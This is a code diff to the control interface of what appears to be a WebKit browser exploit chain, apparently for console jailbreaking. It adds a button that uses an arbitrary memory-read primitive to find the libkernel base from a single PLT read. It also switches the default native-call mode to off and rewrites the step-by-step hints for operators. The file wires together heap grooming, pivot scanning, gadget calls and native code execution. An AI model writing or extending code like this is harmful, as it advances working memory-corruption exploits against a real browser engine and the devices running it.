@@ -48,6 +48,7 @@ import {
     verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
     calcLkBestFromFnPtr,
+    resolveLkOnePltStep,
     extPtrToLkCandidates,
     plausibleHeapCell,
     resolveExtModuleHunt,
@@ -58,9 +59,9 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832n";
+const BUILD_ID = "rw-20250832o";
 const SS_NATIVE_MODE = "wk-native-mode";
-/** Auto-fire at PRIMITIVE-OK — set via #native-mode dropdown (not URL). */
+/** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
     if (nativeModeSel && nativeModeSel.value)
         return String(nativeModeSel.value).toLowerCase();
@@ -68,10 +69,10 @@ function getNativeMode() {
         const s = sessionStorage.getItem(SS_NATIVE_MODE);
         if (s) return s.toLowerCase();
     } catch (_) { }
-    return "usleep";
+    return "off";
 }
 function setNativeMode(mode) {
-    mode = String(mode || "usleep").toLowerCase();
+    mode = String(mode || "off").toLowerCase();
     if (nativeModeSel) nativeModeSel.value = mode;
     try { sessionStorage.setItem(SS_NATIVE_MODE, mode); } catch (_) { }
 }
@@ -143,7 +144,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnTryBillZaiLk;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
@@ -255,6 +256,10 @@ function setUi() {
     if (btnLoadCal) {
         btnLoadCal.disabled = busy;
         btnLoadCal.textContent = "Calc lk";
+    }
+    if (btnOneReadLk) {
+        btnOneReadLk.disabled = busy || !ready;
+        btnOneReadLk.textContent = "1-read lk";
     }
     if (btnForceLk) {
         btnForceLk.disabled = busy;
@@ -2100,13 +2105,55 @@ function runTryCalPtrs() {
     calcLkFromHex();
 }
 
+function runOneReadLk() {
+    if (!window.p || !ready) {
+        mark("LK-SKIP", "Start first (need webkitBase from this WebKit process)");
+        state("Start first", "bad");
+        renderOut();
+        return;
+    }
+    const p = window.p;
+    const off = loadEffectiveOff();
+    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+    if (!webkitBase && nativePrep && nativePrep.webkitBase)
+        webkitBase = nativePrep.webkitBase;
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase in session");
+        renderOut();
+        return;
+    }
+    try {
+        const r = resolveLkOnePltStep(p, webkitBase, off);
+        if (r.ok) {
+            saveLibkernelSession(r.lk, r.pltRva, { forced: true });
+            if (addrIn) addrIn.value = String(r.lk);
+            mark("LK-OK", "WebKit 1-read plt+0x" + r.pltRva.toString(16)
+                + " → " + r.lk + " (" + r.via + ") — NOT Okage");
+            mark("LK-HINT", "reload → native mode usleep → Start");
+            state("WebKit lk OK — reload + Start", "ok");
+            crashLog.append("LK-1READ " + r.lk + " plt=" + r.pltRva.toString(16), "LK-OK");
+            crashLog.flushSync();
+        } else {
+            mark("LK-MISS", (r.idx + 1) + "/" + r.total + " plt+0x"
+                + (r.pltRva != null ? r.pltRva.toString(16) : "?")
+                + " — " + (r.error || "?"));
+            mark("LK-HINT", "tap 1-read lk again (one PLT per tap, not a scan)");
+            state("miss — tap 1-read lk again", "warn");
+        }
+    } catch (err) {
+        mark("LK-FAIL", err.message || String(err));
+        state("1-read error", "bad");
+    }
+    renderOut();
+}
+
 function acceptLkFromHex(hexOverride) {
     const off = loadEffectiveOff();
     let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
     if (!hex && addrIn && addrIn.value)
         hex = addrIn.value.trim().replace(/^0x/i, "");
     if (!hex) {
-        mark("LK-SKIP", "paste Okage lk in hex (e.g. 83f33ac30) — no cal ext ptr needed");
+        mark("LK-SKIP", "paste Okage lk in hex (e.g. 83f33ac30) — prefer 1-read lk after Start");
         state("paste lk …c30 in hex box", "bad");
         renderOut();
         return false;
@@ -3559,12 +3606,12 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Okage: paste 83f33ac30 → Accept lk → reload → Start");
+        mark("HINT", "Start → 1-read lk (WebKit) → reload → native usleep → Start");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — Accept Okage lk, reload, Start", "ok");
+        state("primitive OK — 1-read lk for WebKit base", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -3611,6 +3658,7 @@ function init() {
     btnNative = $("btn-native");
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
+    btnOneReadLk = $("btn-one-read-lk");
     btnTryBillZaiLk = $("btn-try-billzai-lk");
     btnGuessLk = $("btn-guess-lk");
     btnPsfreeLite = $("btn-psfree-lite");
@@ -3636,6 +3684,7 @@ function init() {
     wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
+    wireClick(btnOneReadLk, runOneReadLk);
     wireClick(btnForceLk, function () { acceptLkFromHex(null); });
     wireClick(btnTryBillZaiLk, function () { runManualTest("try-billzai-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
@@ -3729,7 +3778,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("paste Okage lk → Accept lk → reload → Start", "");
+    state("Start → 1-read lk (WebKit) — Okage lk is wrong process", "");
 }
 
 function bootUi() {
